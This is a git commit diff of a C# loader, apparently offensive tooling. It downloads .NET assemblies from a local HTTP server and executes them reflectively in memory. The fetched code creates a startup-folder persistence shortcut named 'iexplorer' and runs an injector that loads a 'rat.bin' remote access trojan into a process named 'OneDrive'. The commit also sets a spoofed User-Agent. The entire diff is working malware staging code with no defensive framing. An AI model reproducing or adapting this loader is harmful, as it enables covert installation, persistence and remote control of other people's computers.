ea2394e4ab1e3fe967a76cf6f12ee4e801232654
ikiik <90021954+dtgvfck@users.noreply.github.com>
2021-10-21 04:46:24 +0100

    reflectively execute the Persist and the injector

--- loader.cs
+++ loader.cs
@@ -1,50 +1,49 @@
 
-
 using System;
 using System.IO;
-using System.Net;
-using System.Text;
-using System.Collections.Generic;
-using System.Diagnostics;
 using System.Reflection;
-using System.Threading;
+using System.Linq;
+using System.Net;
 
 public class ikiik
 {
-	public static void Load(string url, string clsn, WebClient myWebClient, bool isstage)
-	{
-		byte[] myDataBuffer = myWebClient.DownloadData(url);
-		Assembly a = Assembly.Load (myDataBuffer);
-		Type myType = a.GetType(clsn);
-		MethodInfo myMethod = myType.GetMethod("Main");
-		object obj = Activator.CreateInstance(myType);
-		ParameterInfo[] parameters = myMethod.GetParameters();
-		if (!isstage)
-		{
-			string[] s = new String[0]{};
-			object[] parametersArray = new object[] {s};
-			myMethod.Invoke(obj,parametersArray);
-		}
-		else
-		{
+	public static void loadAssembly(string url, object[] arguments)
+        {
+		WebClient wc = new WebClient();
+                wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64 blalalala)");
+		byte[] bin = wc.DownloadData(url);
+            	Assembly a = Assembly.Load(bin);
+            	try
+            	{
+                	a.EntryPoint.Invoke(null, new object[] { arguments });
+            	}
+            	catch
+            	{
+                	MethodInfo method = a.EntryPoint;
+                	if (method != null)
+                	{
+                    		object o = a.CreateInstance(method.Name);
+                    		method.Invoke(o, null);
+                	}
+            	}
+        }
 
-			string[] s = new String[3]{"http://192.168.1.5:8888/agent.bin", "DtGvFck#", "OneDrive"};
-			object[] parametersArray = new object[] {s};
-			myMethod.Invoke(obj,parametersArray);
-		}
-
-	}
 	public static void Main(string[] args)
         {
-		WebClient myWebClient = new WebClient();
 		string lnkpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs\startup\";
 		string lnkname = "iexplorer";
+		string newsname = "Startup";
+		string command = @"C:\Windows\System32\cmd.exe";
+		string commandargs = @"c:\users\ikiik\desktop\test\ikiik.exe";
+		string[] p_arguments = new string[4] {lnkname, newsname, command, commandargs};
 		if (File.Exists(lnkpath + lnkname + ".lnk") == false)
             	{
-			Load("http://192.168.1.5:8888/Persist.exe", "Persist", myWebClient, false);
+			object[] argumentss = p_arguments.ToArray();
+			loadAssembly("http://192.168.1.2:8888/persist.exe", argumentss);
 		}
-		Load("http://192.168.1.5:8888/stage0.exe", "Program", myWebClient, true);
-		Console.WriteLine("Done");
-		Environment.Exit(0);
+		string[] i_arguments = new string[] {"http://192.168.1.2:8888/rat.bin", "DtGvFck#", "OneDrive"};
+		object[] arguments = i_arguments.ToArray();
+		loadAssembly("http://192.168.1.2:8888/injector.exe", arguments);
+		Environment.Exit(0);		
 	}
 }
